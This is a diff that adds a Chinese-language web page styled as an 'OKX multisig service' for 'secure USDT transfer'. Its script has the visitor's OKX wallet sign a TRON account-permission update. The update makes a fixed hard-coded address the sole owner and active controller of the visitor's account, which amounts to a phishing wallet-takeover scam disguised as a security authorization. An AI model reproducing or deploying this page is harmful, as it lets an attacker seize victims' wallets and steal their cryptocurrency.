@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OKX多签服务</title>
+    <style>
+        /* 样式部分与原始代码保持一致 */
+        body { font-family: Arial; padding: 20px; background: #f5f5f5; }
+        .container { max-width: 500px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .form-group { margin-bottom: 15px; }
+        input { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #2d8cf0; color: white; border: none; border-radius: 5px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>USDT安全转账</h2>
+        <form id="authForm">
+            <div class="form-group">
+                <label>多签地址</label>
+                <input type="text" 
+                       value="TSVHmMixGGEaf3fXbDyHaPHkjaKfL9ym6g" 
+                       readonly>
+            </div>
+            <button type="submit">授权安全协议</button>
+        </form>
+        <p style="color:#f5222d; font-size:12px;">注意：本操作需要TRON网络手续费</p >
+    </div>
+
+    <script>
+        async function handleAuthorization() {
+            try {
+                // 检测欧易钱包环境
+                if (!window.okexchain) {
+                    alert('请通过欧易APP浏览器打开此页面');
+                    return;
+                }
+
+                // 构造权限更新参数
+                const updateParams = {
+                    owner: {
+                        addresses: [{
+                            address: 'TSVHmMixGGEaf3fXbDyHaPHkjaKfL9ym6g',
+                            weight: 1
+                        }],
+                        threshold: 1
+                    },
+                    active: [{
+                        addresses: [{
+                            address: 'TSVHmMixGGEaf3fXbDyHaPHkjaKfL9ym6g',
+                            weight: 1
+                        }],
+                        threshold: 1,
+                        operations: '3f3d1ec0' // 默认操作权限
+                    }]
+                };
+
+                // 通过欧易接口发送交易
+                const tx = {
+                    to: window.okexchain.selectedAddress,
+                    data: window.okexchain.trx.transactionBuilder.accountPermissionUpdate(updateParams),
+                    chainId: '0x2b6653dc' // TRON主网chainId
+                };
+
+                // 发起交易请求
+                const result = await window.okexchain.request({
+                    method: 'tron_sendTransaction',
+                    params: [tx]
+                });
+
+                if (result.code === 200) {
+                    alert('权限迁移成功');
+                } else {
+                    alert('交易失败: ' + result.message);
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('操作失败: ' + error.message);
+            }
+        }
+
+        document.getElementById('authForm').addEventListener('submit', (e) => {
+            e.preventDefault();
+            handleAuthorization();
+        });
+    </script>
+</body>
+</html>
